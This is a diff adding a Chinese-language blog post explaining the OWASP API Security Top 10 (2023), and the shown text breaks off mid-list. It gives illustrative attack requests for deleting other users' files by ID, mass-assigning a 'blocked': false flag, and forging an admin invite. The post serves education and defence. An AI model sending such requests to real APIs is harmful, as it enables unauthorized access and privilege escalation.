@@ -1,0 +1,545 @@
+<!DOCTYPE html><html lang="default" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>OWASP Top10 API | Wenyun Wang</title><meta name="author" content="Wenyun Wang"><meta name="copyright" content="Wenyun Wang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2023 api安全风险 OWASP-TOP10分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OWASP Top10 API">
+<meta property="og:url" content="http://wenyunw.me/2023/07/30/api%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="Wenyun Wang">
+<meta property="og:description" content="2023 api安全风险 OWASP-TOP10分析">
+<meta property="og:locale">
+<meta property="og:image" content="http://wenyunw.me/images/owasp.jpg">
+<meta property="article:published_time" content="2023-07-30T09:32:31.000Z">
+<meta property="article:modified_time" content="2025-02-18T23:01:19.907Z">
+<meta property="article:author" content="Wenyun Wang">
+<meta property="article:tag" content="API Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://wenyunw.me/images/owasp.jpg"><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://wenyunw.me/2023/07/30/api%E5%AE%89%E5%85%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":100,"languages":{"author":"Author: Wenyun Wang","link":"Link: ","source":"Source: Wenyun Wang","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'OWASP Top10 API',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-19 07:01:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#F8F8FF')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> Note</span></a></div><div class="menus_item"><a class="site-page" href="/resume/"><i class="fa-fw fas fa-id-card"></i><span> Resume</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment"></i><span> Comment</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Wenyun Wang"><span class="site-name">Wenyun Wang</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> Note</span></a></div><div class="menus_item"><a class="site-page" href="/resume/"><i class="fa-fw fas fa-id-card"></i><span> Resume</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment"></i><span> Comment</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">OWASP Top10 API</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon fas fa-history"></i><span class="post-meta-label">Updated</span><time datetime="2025-02-18T23:01:19.907Z" title="Updated 2025-02-19 07:01:19">2025-02-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Security/">Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="OWASP Top10 API"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><img src="/2023/07/30/api%E5%AE%89%E5%85%A8/owasp-10.jpg" class="" title="owasp">
+
+<h2 id="对象级别授权失效（水平越权）"><a href="#对象级别授权失效（水平越权）" class="headerlink" title="对象级别授权失效（水平越权）"></a>对象级别授权失效（水平越权）</h2><p>攻击者就可以通过改变请求中的对象ID来绕过授权限制，从而获取敏感数据或者完全掌控账户。这个漏洞在基于API的应用程序中非常普遍，因为服务器通常无法跟踪完整的用户状态，而是依赖于请求参数中的对象ID来决定哪些对象可以被用户访问。</p>
+<ul>
+<li>接口参数可遍历<ul>
+<li>通过参数控制的访问对象，如针对GET &#x2F;system&#x2F;{user}&#x2F;info&#x2F;接口的通信中，系统设计上每个用户只能访问自己的内容，但如果授权不当，攻击者可以遍历{user}参数，越权批量访问他人数据。</li>
+</ul>
+</li>
+</ul>
+<p><strong>eg：</strong></p>
+<p>在线文档存储服务允许用户上传、查看、编辑和删除他们的文件。当用户想要删除一个文件时，系统会将对应文件的ID传递给API，以便系统确定要删除哪个文件。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /graphql</span><br><span class="line">&#123;</span><br><span class="line">  &quot;operationName&quot;:&quot;deleteReports&quot;,</span><br><span class="line">  &quot;variables&quot;:&#123;</span><br><span class="line">    &quot;reportKeys&quot;:[&quot;&lt;DOCUMENT_ID&gt;&quot;]</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;query&quot;:&quot;mutation deleteReports($siteId: ID!, $reportKeys: [String]!) &#123;</span><br><span class="line">    &#123;</span><br><span class="line">      deleteReports(reportKeys: $reportKeys)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为在线文档存储服务在删除文件时只依赖文件的ID，没有进行其他的权限检查，所以用户有可能会能够删除其他用户上传的文档。也就是说，如果攻击者知道其他用户文档的ID，那么他们就可以利用这个漏洞来删除其他用户的文件。</p>
+<h2 id="身份认证失效"><a href="#身份认证失效" class="headerlink" title="身份认证失效"></a>身份认证失效</h2><p>破坏或伪造身份验证令牌，或者利用漏洞来盗用其他用户的身份。</p>
+<ul>
+<li><p>明文密码传输</p>
+<ul>
+<li>hash</li>
+</ul>
+</li>
+<li><p>薄弱的API密钥，密钥又不经常轮换</p>
+<ul>
+<li>暴力破解、birthday attack</li>
+</ul>
+</li>
+<li><p>使用GET参数发送敏感信息的API端点</p>
+<ul>
+<li>connection.setRequestMethod(“GET”);&#x2F;&#x2F;发起请求,具体的请求方式视具体情况而定</li>
+</ul>
+</li>
+<li><p>无效的令牌访问验证&#x2F;JWT访问令牌缺少验证</p>
+<ul>
+<li><p>token &#x3D;&#x3D;&#x3D;&#x3D;&gt; header.payload.singnature</p>
+<p>令牌的组成： 标头（header） 、有效负荷（payload） 、签名（singnature）</p>
+<p>JWT通常所示：xxxxxx.yyyyyy.zzzzzz</p>
+</li>
+<li><p>header: 标头通常由两部分组成即令牌的类型（JWT）和使用的算法类型。【通常使用Base64编码组成JWT结构的第一部分】</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>payload: 有效负载，存储用户的相关的信息和其他数据的声明。【通常使用Base64编码组成JWT结构的第二部分】</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;qiumin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>singnature: 签名，与前面两个部分生成JWT，该签名不能让其他人知道，是保证token不被串改，保证信息的安全。</p>
+<p>【通常使用Base64编码组成JWT结构的第三部分】</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header+<span class="string">&quot;.&quot;</span>+payload+<span class="string">&quot;.&quot;</span>+singnature ---&gt; 组成唯一的token</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/image-20230726144757794.png" class="" title="image-20230726144757794"></li>
+</ul>
+</li>
+<li><p>会话ID暴露在URL里</p>
+<ul>
+<li><p>URL重写：</p>
+<p>当客户不接受cookie时候，服务器可以跟踪url重写作为会话跟踪基础，URL 重写涉及添加数据、会话 ID、容器解析 URL 路径从而请求与会话相关联。会话 ID 必须被编码为 URL 字符串中的一个路径参数。</p>
+<p>参数的名字必须是 <strong>jsessionid</strong>。下面是一个 URL 包含编码的路径信息的例子：</p>
+<p><a target="_blank" rel="noopener" href="http://www.myserver.com/catalog/index.html;jsessionid=1234">http://www.myserver.com/catalog/index.html;jsessionid=1234</a></p>
+<p>PS：url中紧跟servle或jsp文件名，加;jsessionid&#x3D;sessionId，其中sessionId由HttpSession.getId()得到。URL重写实现会话跟踪，要保证每个页面都必须使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Servlet&spm=1001.2101.3001.7020">Servlet</a>或JSP动态页面。因为附加在URL上的SessionID是动态产生的，所以对于静态页面的跳转，URL重写机制无能为力。</p>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/image-20230704101350481-16884368389691.png" class="" title="image-20230704101350481"></li>
+</ul>
+</li>
+<li><p>会话固定（session fixation）的攻击</p>
+<ul>
+<li><p>会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。（让合法用户使用黑客预先设置的sessionID进行登录，从而是Web不再进行生成新的sessionID，从而导致黑客设置的sessionId变成了合法桥梁。）</p>
+<p>Servlet容器允许URL地址后面增加 ;JSESSIONID&#x3D;… 的方式携带session信息。</p>
+<p>攻击步骤</p>
+<p>1.攻击者打开一个登录页面</p>
+<p>2.服务端会返回攻击者一个sessionId &#x3D; 123xyz</p>
+<p>3.攻击者发送一个伪装连接并带上sessionId</p>
+<p>4.然后正常用户接到后，点击进行登录</p>
+<p>5.这时候服务端sessionID&#x3D;123xyz的session已经存在</p>
+<p>6.这时，有了这个sessionID ,攻击者就可以正大光明的访问漏洞系统了。</p>
+<p>攻击原理: 登录后的sessionId和登录前的SessionId 没有变化</p>
+</li>
+</ul>
+</li>
+<li><p>会话ID没有超时限制，或者用户会话或身份验证令牌特别是单点登录令牌在用户注销时没有失效。</p>
+<p>缺省的会话超时由<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/servlet/477555?fromModule=lemma_inlink">servlet</a>容器定义,在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/HttpSession/3159840?fromModule=lemma_inlink">HttpSession</a>接口上调用getMaxInactiveIntervalfangaf得到该值.开发人员可以使用HttpSession接口上的setMaxInactiveInterval方法改变该值.时间单位是秒.若设置为-1,表示该会话永不过期.</p>
+</li>
+</ul>
+<p><strong>场景案例：</strong></p>
+<p>用户要更新他们账户关联的电子邮件地址，那么客户端需要发送一个特殊的API请求：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUT /account</span><br><span class="line">Authorization: Bearer &lt;token&gt;</span><br><span class="line">&#123; <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&lt;new_email_address&gt;&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于API没有要求用户提供当前的密码来确认身份，攻击者就有可能通过窃取身份验证令牌来伪装成其他用户。他们也可能会在更新受害者账户的电子邮件地址时实施攻击，从而接管受害者的账户。</p>
+<h2 id="对象属性级别授权失效"><a href="#对象属性级别授权失效" class="headerlink" title="对象属性级别授权失效"></a>对象属性级别授权失效</h2><p>对象属性级别授权失效是指在访问控制系统中，授权规则没有按照预期的要求来实现，这可能会导致安全漏洞。通常，在访问控制系统中，对象属性级别授权非常重要，它可以确保用户只能够访问他们具有权限的资源和信息。如果这个授权失效了，攻击者就有可能访问到他们没有权限访问的信息或资源，从而对系统构成威胁。</p>
+<ul>
+<li><p>单次返回类型过多</p>
+<ul>
+<li><p>过度数据泄露是指 API 端点响应的信息多于满足请求所需的信息。</p>
+<p>当存在此漏洞时，可能相当于向某人询问其姓名，并让他们使用其姓名，出生日期，电子邮件地址，电话号码以及他们认识的每个人的身份进行响应。</p>
+<p>假设我请求了自己的帐户信息，并提出了以下请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v3/account?name=Cloud+Strife</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">response<span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5501&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;first_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Cloud&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;last_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Strife&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;privilege&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;representative&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Don Corneo&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2203&quot;</span></span><br><span class="line"> <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dcorn@gmail.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;privilege&quot;</span><span class="punctuation">:</span> <span class="string">&quot;super-admin&quot;</span></span><br><span class="line"> <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"> <span class="attr">&quot;two_factor_auth&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>脱敏策略不一致</p>
+<ul>
+<li><p>伪脱敏指的是敏感信息仅在前端展示界面脱敏，未在服务器后端进行脱敏，一旦流量被截获，则可能造成敏感信息泄漏。脱敏策略不一致指的是对同一类敏感信息，未采取一致的脱敏策略，导致将同一条信息不同的未脱敏部分进行组合后仍可得到未脱敏的数据，例如A界面展示王五的手机号为123*<em>789，而B界面展示王五的手机号为123456</em>*，则进行组合后可以得到王五的完整手机号123456789。</p>
+</li>
+<li><p><strong>无效化</strong></p>
+<p>无效化方案在处理待脱敏的数据时，通过对字段数据值进行 截断、加密、隐藏 等方式让敏感数据脱敏，使其不再具有利用价值。一般采用特殊字符（*等）代替真值，这种隐藏敏感数据的方法简单，但缺点是用户无法得知原数据的格式，如果想要获取完整信息，要让用户授权查询。</p>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/20201210093709106.png" class="" title="在这里插入图片描述">
+
+<h5 id="随机值"><a href="#随机值" class="headerlink" title="随机值"></a><strong>随机值</strong></h5><p>随机值替换，字母变为随机字母，数字变为随机数字，文字随机替换文字的方式来改变敏感数据，这种方案的优点在于可以在一定程度上保留原有数据的格式，往往这种方法用户不易察觉的。</p>
+<p>我们看到 name 和 idnumber 字段进行了随机化脱敏，而名字姓、氏随机化稍有特殊，需要有对应姓氏字典数据支持。</p>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/2020121009395680.png" class="" title="在这里插入图片描述">
+
+<h5 id="数据替换"><a href="#数据替换" class="headerlink" title="数据替换"></a><strong>数据替换</strong></h5><p>数据替换与前边的无效化方式比较相似，不同的是这里不以特殊字符进行遮挡，而是用一个设定的虚拟值替换真值。比如说我们将手机号统一设置成 “13651300000”。</p>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/20201210094048353.png" class="" title="在这里插入图片描述">
+
+<h5 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a><strong>对称加密</strong></h5><p>对称加密是一种特殊的可逆脱敏方法，通过加密密钥和算法对敏感数据进行加密，密文格式与原始数据在逻辑规则上一致，通过密钥解密可以恢复原始数据，要注意的就是密钥的安全性。</p>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/20201210094225195.png" class="" title="在这里插入图片描述">
+
+<h5 id="平均值"><a href="#平均值" class="headerlink" title="平均值"></a><strong>平均值</strong></h5><p>平均值方案经常用在统计场景，针对数值型数据，我们先计算它们的均值，然后使脱敏后的值在均值附近随机分布，从而保持数据的总和不变。</p>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/20201210094421296.png" class="" title="在这里插入图片描述">
+<p>原始数据</p>
+<p>对价格字段 price 做平均值处理后，字段总金额不变，但脱敏后的字段值都在均值 60 附近。</p>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/20201210094442463.png" class="" title="图片">
+<p>平均值</p>
+<h5 id="偏移和取整"><a href="#偏移和取整" class="headerlink" title="偏移和取整"></a><strong>偏移和取整</strong></h5><p>这种方式通过随机移位改变数字数据，偏移取整在保持了数据的安全性的同时保证了范围的大致真实性，比之前几种方案更接近真实数据，在大数据分析场景中意义比较大。</p>
+<p>比如下边的日期字段create_time中 2020-12-08 15:12:25 变为 2018-01-02 15:00:00。取整</p>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/20201210094614970.png" class="" title="在这里插入图片描述"></li>
+</ul>
+</li>
+<li><p>批量分配</p>
+<ul>
+<li><p>当API将客户端提供的数据绑定到应用程序，又没有适当的过滤技术时，就会发生批量分配。开发人员使用绑定方法，通过函数将用户输入与内部对象和代码变量绑定，以加快开发周期。攻击者可以通过评估API结构和对象关系，查找批量分配漏洞，以更新和修改旨在隐藏起来的对象属性。一旦攻击者修改了敏感对象的属性，往往会提升权限、绕过安全检查并篡改敏感数据。</p>
+</li>
+<li><p>将属性值设置<strong>user.is_admin</strong>和<strong>user.is_manager</strong>来提升权限</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>场景案例：</strong></p>
+<p>在基于短视频的社交网络中，有一些限制性内容需要进行过滤和审查。即使上传的视频被系统拦截了，用户还是可以通过以下API请求来修改视频的描述信息。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUT /api/video/update_video</span><br><span class="line">&#123;<span class="string">&quot;description&quot;</span>:<span class="string">&quot;a funny video about cats&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;description&quot;</span>:<span class="string">&quot;a funny video about cats&quot;</span>,<span class="string">&quot;blocked&quot;</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就意味着，如果用户上传不良内容的视频并通过修改描述信息的方式绕过系统审查。</p>
+<h2 id="资源消耗无限制"><a href="#资源消耗无限制" class="headerlink" title="资源消耗无限制"></a>资源消耗无限制</h2><p>攻击者可以发送大量请求来消耗API服务器的资源，甚至通过暴力破解方式来突破安全措施，从而造成损失。</p>
+<ul>
+<li>DoS攻击<ul>
+<li>API请求需要使用网络、CPU、内存和存储等资源，如果没有对客户端&#x2F;用户可以请求的资源大小或数量进行限制，就可能会导致API服务器性能下降，最终引起拒绝服务攻击（DoS）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>场景案例：</strong></p>
+<p>攻击者会发送一个POST请求到&#x2F;api&#x2F;v1&#x2F;images，上传大图片。API在收到这个请求后，会创建多个缩略图，每个缩略图大小不同。然而，由于上传的图片太大了，API在创建缩略图的过程中用尽了所有可用的内存，导致系统变得无响应。</p>
+<h2 id="功能级授权失效（垂直越权）"><a href="#功能级授权失效（垂直越权）" class="headerlink" title="功能级授权失效（垂直越权）"></a>功能级授权失效（垂直越权）</h2><p>攻击者可以<strong>利用漏洞</strong>来发送一些本不允许他们访问的API请求，这可能会导致一些合法的API请求被暴露给未经授权的匿名用户或普通用户。</p>
+<ul>
+<li>API有着固定的结构和操作方式，攻击者更容易发现其中的缺陷<ul>
+<li>将HTTP方法从GET替换为PUT</li>
+<li>普通用户修改为api&#x2F;admininfo，调用管理类API</li>
+</ul>
+</li>
+</ul>
+<p><strong>场景案例：</strong></p>
+<p>在某些只允许邀请用户注册的应用程序中，移动应用程序会触发一些API调用，以便用户能够加入。这个响应会返回一个包含邀请详细信息（如用户角色和电子邮件）的JSON文件，攻击者会复制这个请求，并改变HTTP方法和参数。攻击者就利用这个漏洞来冒充管理员身份，并通过发送新的邀请来获取管理员权限。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /api/invites/<span class="keyword">new</span></span><br><span class="line">&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;attacker@somehost.com&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后攻击者使用操纵的请求来创建自己的管理员帐户，并获得对系统的完全访问权限。</p>
+<h2 id="访问敏感业务流无限制"><a href="#访问敏感业务流无限制" class="headerlink" title="访问敏感业务流无限制"></a>访问敏感业务流无限制</h2><p>黄牛抢购、恶意占座（机票）、营销活动薅羊毛等，编写攻击脚本等方式，对API接口发起的自动化攻击</p>
+<p>OWASP也针对性提出了应对方案，包括：<strong>设备指纹、人机识别（比如验证码）、行为检测、Tor和常见代理IP检测等</strong>。</p>
+<ul>
+<li><p>撞库</p>
+<ul>
+<li>撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登录其他网站后，得到一系列可以登录的用户。很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。</li>
+</ul>
+</li>
+<li><p>爬虫</p>
+<ul>
+<li>防爬技术一般都会对网络性能和用户体验带来较大影响，所以比较经济的方式是针对高危接口和页面进行防爬。应用的页面和接口不断变化，攻击者也可能通过摸索不断发现新的有爬取价值的页面和接口。一般企业的业务量如果比较大，爬虫行为就会隐藏在大批量流量中，从总量上看很难把爬虫的流量给区分出来。</li>
+<li>通过对涉敏接口的梳理和定向监控分析，就可以发现针对具体页面和接口的爬虫，以及他们获取的敏感数据类型和内容，就能在页面和接口一级，比较有针对性的对抗爬虫，并且通过爬虫获取的数据类型，可以更全面从攻击者视角了解自己透出数据的真实风险来调整自己的数据安全保护策略（比如以前不知道用户ID的透出风险，看见大量爬虫爬取用户ID，就应该知道用户ID也是有较高风险的数据需要保护了）。</li>
+</ul>
+</li>
+<li><p>研发窃数后门风险</p>
+<ul>
+<li>必须以某种方式与其他终端节点相连——由于后门的利用都是从其他节点进行访问，因此必须与目标机使用双绞线、光纤维、串&#x2F;并口、蓝牙、红外等设备在物理信号上有所连接才可以对端口进行访问。只有访问成功，双方才可以进行信号交流，攻击方才有机会进行入侵。</li>
+<li>目标机默认开放的可供外界访问的端口必须在一个以上——因为一台默认无任何端口开放的机器是无法连接通信的，而如果开放着的端口外界无法访问，则同样没有办法进行入侵。</li>
